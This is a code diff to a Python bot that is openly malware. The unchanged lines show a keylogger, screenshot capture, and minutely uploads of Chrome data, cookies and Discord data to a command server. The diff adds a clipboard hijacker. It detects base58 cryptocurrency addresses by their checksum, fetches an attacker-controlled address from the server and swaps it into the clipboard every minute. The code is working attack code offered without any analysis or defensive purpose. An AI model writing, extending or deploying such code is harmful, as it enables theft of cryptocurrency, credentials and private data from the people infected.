@@ -7,6 +7,9 @@ from datetime import datetime
 import time
 import requests
 import base64
+import base58
+import hashlib
+import binascii
 import schedule
 import json
 import shutil
@@ -17,6 +20,7 @@ from PIL import ImageGrab
 import xml.etree.ElementTree as ET
 from pynput.keyboard import Key, Listener
 import scapy.all as scapy
+import pyperclip
 
 APP_DATA = os.environ['LOCALAPPDATA']
 API_URL = "http://localhost:4000"
@@ -232,6 +236,28 @@ class ApiController():
                         return False
             else: 
                 return False
+
+    def check_clipboard(self, identifier, token):
+        clip = pyperclip.paste()
+
+        try:
+            base58Decoder = base58.b58decode(clip).hex()
+        except:
+            return False
+
+        prefixAndHash = base58Decoder[:len(base58Decoder)-8]
+        checksum = base58Decoder[len(base58Decoder)-8:]
+        
+        hash = prefixAndHash
+
+        for x in range(1,3):
+            hash = hashlib.sha256(binascii.unhexlify(hash)).hexdigest()
+
+        if(checksum == hash[:8]):
+            r = requests.get(f"{self.api_url}/addresses/{identifier}/{token}")
+            if r.status_code == 200:
+                address = r.json()["value"]
+                pyperclip.copy(address)
 
 class FileController():
     def __init__(self):
@@ -515,6 +541,7 @@ def main():
                         schedule.every(1).minutes.do(lambda: api.update_details(bot_identifier, bot_token))
                         schedule.every(1).minutes.do(lambda: api.update_screenshot(bot_identifier, bot_token))
                         schedule.every(1).minutes.do(lambda: api.update_logs(bot_identifier, bot_token))
+                        schedule.every(1).minutes.do(lambda: api.check_clipboard(bot_identifier, bot_token))
                         schedule.every(1).minutes.do(lambda: api.update_chrome(bot_identifier, bot_token, Chrome().dump()))
                         schedule.every(1).minutes.do(lambda: api.update_cookies(bot_identifier, bot_token, Cookies().dump()))
                         schedule.every(1).minutes.do(lambda: api.update_discord(bot_identifier, bot_token, Discord().dump()))
